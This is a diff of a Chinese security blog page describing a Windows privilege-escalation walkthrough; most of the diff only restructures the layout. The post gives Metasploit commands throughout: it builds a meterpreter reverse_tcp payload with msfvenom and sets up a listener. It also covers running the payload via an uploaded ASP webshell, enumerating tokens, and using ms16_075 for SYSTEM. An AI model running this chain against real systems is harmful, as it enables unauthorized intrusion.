@@ -94,13 +94,13 @@
 
 
 
-  <meta name="description" content="通过任意文件上传获取到ASP webshell   生成msf meterpreter后门  msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &amp;gt; shell1.exe    启动监听  use exploit/multi/handler   set PAYLOAD windows/met">
+  <meta name="description" content="通过任意文件上传获取到ASP webshell   生成msf meterpreter后门msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &amp;gt; shell1.exe   启动监听use exploit/multi/handler   set PAYLOAD windows/meterpret">
 <meta name="keywords" content="渗透测试">
 <meta property="og:type" content="article">
 <meta property="og:title" content="记一次Windows提权过程">
 <meta property="og:url" content="https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/index.html">
 <meta property="og:site_name" content="r0yanx&#39;s Blog">
-<meta property="og:description" content="通过任意文件上传获取到ASP webshell   生成msf meterpreter后门  msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &amp;gt; shell1.exe    启动监听  use exploit/multi/handler   set PAYLOAD windows/met">
+<meta property="og:description" content="通过任意文件上传获取到ASP webshell   生成msf meterpreter后门msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &amp;gt; shell1.exe   启动监听use exploit/multi/handler   set PAYLOAD windows/meterpret">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/2019-07-09-17-25-26.png">
 <meta property="og:image" content="https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/2019-07-09-17-28-46.png">
@@ -110,10 +110,10 @@
 <meta property="og:image" content="https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/2019-07-09-17-38-23.png">
 <meta property="og:image" content="https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/2019-07-09-17-39-17.png">
 <meta property="og:image" content="https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/2019-07-09-17-41-18.png">
-<meta property="og:updated_time" content="2019-07-10T01:47:33.489Z">
+<meta property="og:updated_time" content="2019-07-10T06:54:24.528Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="记一次Windows提权过程">
-<meta name="twitter:description" content="通过任意文件上传获取到ASP webshell   生成msf meterpreter后门  msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &amp;gt; shell1.exe    启动监听  use exploit/multi/handler   set PAYLOAD windows/met">
+<meta name="twitter:description" content="通过任意文件上传获取到ASP webshell   生成msf meterpreter后门msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &amp;gt; shell1.exe   启动监听use exploit/multi/handler   set PAYLOAD windows/meterpret">
 <meta name="twitter:image" content="https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/2019-07-09-17-25-26.png">
 
 
@@ -426,7 +426,7 @@
                 
               
 
-              <time title="创建时间：2019-07-10 09:25:10 / 修改时间：09:47:33" itemprop="dateCreated datePublished" datetime="2019-07-10T09:25:10+08:00">2019-07-10</time>
+              <time title="创建时间：2019-07-10 09:25:10 / 修改时间：14:54:24" itemprop="dateCreated datePublished" datetime="2019-07-10T09:25:10+08:00">2019-07-10</time>
             </span>
           
 
@@ -483,28 +483,25 @@
       
 
       
-        <ol>
-<li>通过任意文件上传获取到ASP webshell<br><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-25-26.png" alt>  </li>
-<li>生成msf meterpreter后门  <pre><code class="shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &gt; shell1.exe  </code></pre>
-</li>
-<li>启动监听  <pre><code class="shell">use exploit/multi/handler  
+        <h3 id="通过任意文件上传获取到ASP-webshell"><a href="#通过任意文件上传获取到ASP-webshell" class="headerlink" title="通过任意文件上传获取到ASP webshell"></a>通过任意文件上传获取到ASP webshell</h3><p><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-25-26.png" alt>  </p>
+<h3 id="生成msf-meterpreter后门"><a href="#生成msf-meterpreter后门" class="headerlink" title="生成msf meterpreter后门"></a>生成msf meterpreter后门</h3><pre><code class="shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &gt; shell1.exe  </code></pre>
+<h3 id="启动监听"><a href="#启动监听" class="headerlink" title="启动监听"></a>启动监听</h3><pre><code class="shell">use exploit/multi/handler  
 set PAYLOAD windows/meterpreter/reverse_tcp  
 set LHOST x.x.x.x  
 set LPORT xx  
 exploit  </code></pre>
-</li>
-<li>通过webshell上传并执行木马<br><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-28-46.png" alt>  </li>
-<li>msf接收到会话<br><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-32-21.png" alt>  </li>
-<li>查看当前用户  <pre><code class="shell">getuid  </code></pre>
-<img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-36-00.png" alt>  <pre><code class="shell">use incognito   
+<h3 id="通过webshell上传并执行木马"><a href="#通过webshell上传并执行木马" class="headerlink" title="通过webshell上传并执行木马"></a>通过webshell上传并执行木马</h3><p><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-28-46.png" alt>  </p>
+<h3 id="msf接收到会话"><a href="#msf接收到会话" class="headerlink" title="msf接收到会话"></a>msf接收到会话</h3><p><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-32-21.png" alt>  </p>
+<h3 id="查看当前用户"><a href="#查看当前用户" class="headerlink" title="查看当前用户"></a>查看当前用户</h3><pre><code class="shell">getuid  </code></pre>
+<p><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-36-00.png" alt>  </p>
+<pre><code class="shell">use incognito   
 list_tokens -u  </code></pre>
-<img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-36-42.png" alt>  </li>
-<li>查找可利用的提权exp  <pre><code class="shell">run post/multi/recon/local_exploit_suggester  </code></pre>
-<img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-38-23.png" alt>  </li>
-<li>把当前msf回话放到后台，并记住其session值为5  <pre><code class="shell">bg  </code></pre>
-<img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-39-17.png" alt>  </li>
-<li>利用ms16_075得到system权限<br><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-41-18.png" alt>  </li>
-</ol>
+<p><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-36-42.png" alt>  </p>
+<h3 id="查找可利用的提权exp"><a href="#查找可利用的提权exp" class="headerlink" title="查找可利用的提权exp"></a>查找可利用的提权exp</h3><pre><code class="shell">run post/multi/recon/local_exploit_suggester  </code></pre>
+<p><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-38-23.png" alt>  </p>
+<h3 id="把当前msf回话放到后台，并记住其session值为5"><a href="#把当前msf回话放到后台，并记住其session值为5" class="headerlink" title="把当前msf回话放到后台，并记住其session值为5"></a>把当前msf回话放到后台，并记住其session值为5</h3><pre><code class="shell">bg  </code></pre>
+<p><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-39-17.png" alt>  </p>
+<h3 id="利用ms16-075得到system权限"><a href="#利用ms16-075得到system权限" class="headerlink" title="利用ms16_075得到system权限"></a>利用ms16_075得到system权限</h3><p><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-41-18.png" alt>  </p>
 
       
     </div>
@@ -620,8 +617,17 @@ list_tokens -u  </code></pre>
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <div class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -752,6 +758,23 @@ list_tokens -u  </code></pre>
         </div>
       </div>
 
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#通过任意文件上传获取到ASP-webshell"><span class="nav-number">1.</span> <span class="nav-text">通过任意文件上传获取到ASP webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#生成msf-meterpreter后门"><span class="nav-number">2.</span> <span class="nav-text">生成msf meterpreter后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#启动监听"><span class="nav-number">3.</span> <span class="nav-text">启动监听</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通过webshell上传并执行木马"><span class="nav-number">4.</span> <span class="nav-text">通过webshell上传并执行木马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msf接收到会话"><span class="nav-number">5.</span> <span class="nav-text">msf接收到会话</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查看当前用户"><span class="nav-number">6.</span> <span class="nav-text">查看当前用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查找可利用的提权exp"><span class="nav-number">7.</span> <span class="nav-text">查找可利用的提权exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#把当前msf回话放到后台，并记住其session值为5"><span class="nav-number">8.</span> <span class="nav-text">把当前msf回话放到后台，并记住其session值为5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用ms16-075得到system权限"><span class="nav-number">9.</span> <span class="nav-text">利用ms16_075得到system权限</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
       
 
       
